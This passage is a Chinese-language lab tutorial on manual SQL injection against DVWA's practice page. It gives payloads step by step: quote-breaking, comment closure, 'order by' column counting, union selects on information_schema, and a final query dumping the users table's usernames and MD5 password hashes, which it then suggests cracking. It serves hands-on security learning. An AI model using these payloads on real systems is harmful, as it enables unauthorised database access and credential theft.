三、注入过程

（1）选SQL Injection，观察有个ID输入框，输入一些简单的信息，比如1，看有什么结果显示

![](../Images/90160d69bcc47d032d93ca07051deb20.png)

  

![](../Images/2347b0ac4decedfe32ad5379f205885c.png)

  

可以看到会返回三行数据，第一行是ID，第二行是用户名，第三行是别名

接下来就是对参数进行调试，在输入框中输入” 1’ “， 注意1后的单引号是英文的！

![](../Images/1bc8d65c7dd7c77d8e05ef2ca6b69d7c.png)

  

结果说明SQL语句语法错误  

现在的SQL语句是：select First name, surname from users where id = ‘1’’;

而正确的SQL语句应该是: select First name, surname from users where id=’1’;

（3）单引号没有完全闭合，所以应当想办法使单引号闭合。输入1’#，（#号注释掉了后面的单引号）此时的SQL语句是：select First name, surname from users where id-’1’ #’ ，并且返回信息。

![](../Images/8b3c3f084ceb74e467b9e9aab8f77a2e.png)

  

此时可以确定注入点是ID，且为字符型SQL注入。

（4）用order by 分析字段数。

输入payload：1’ order by 1#、1’ order by 2#、1’ order by 3#，显示错误

![](../Images/db7b166d1b774dd40c18f76f9209a2c6.png)

  

 说明字段数为2。

（5）知道字段数后就可以用union select语句获取信息了。

 输入payload：1’ union select user(), database()# （user()、database()是MySQL内置函数）

  

![](../Images/462ceb5b9acb1d48d3a0dbaca9e30ff6.png)

  

得出数据库是dvwa，当前的用户名是root@localhost。

知道数据库后，还远远不够，最重要的用户名和密码还没有出来。

（6）在MySQL数据库中有个数据库information\_schema，存放了所有数据的信息，其中有一个表tables，里面有columns，columns里有三个字段分别为table\_name（表名）、table\_schema（表示这个表所在的数据库）、column\_name（列名）。

有了以上信息后（不知道就度娘！度娘！度娘！或者直接下载个wamp集成环境感受下）可继续构造payload：1’ union select table\_name,2 from information\_schema.tables where table\_schema = ‘dvwa’#

  

![](../Images/a8caf59cefb3fd59033d787e92f26711.png)

  

返回两个表名，很明显users表就是我们需要的啦！知道表名后，还要知道表中的列啊，所以就有：1’ union select column\_name,2 from information\_schema.columns where table\_schema=’dvwa’ and table\_name=’users’#

  

![](../Images/75f9f3bc0713669100f2f16755deb38e.png)

  

这样就得到users表中有user，password这两个列。

最后输入：1’ union select user, password from users#

  

![](../Images/b9ef0f8f3a6277da569045045b66ab5d.png)

  

得到用户名admin和一串经过md5编码后的password，在网上现找md5解码就可以得到明文形式的password。最后去Brute Force中输入用户名和密码，okay！

  

![](../Images/35faeccea06065a56e12e1d735dda1ca.png)

  

四、其他

  Web Security中包含了很多种漏洞，SQL Injection是其中一种，而DVWA是一个很好的练习平台，基本上包含了基本的漏洞姿势，感兴趣的可以多练练手。对SQL语句不熟悉的，可以先去网上百度下视频来学习，想要对SQL Injection进一步了解的话，《SQL注入攻击与防御》是一个不错的选择。
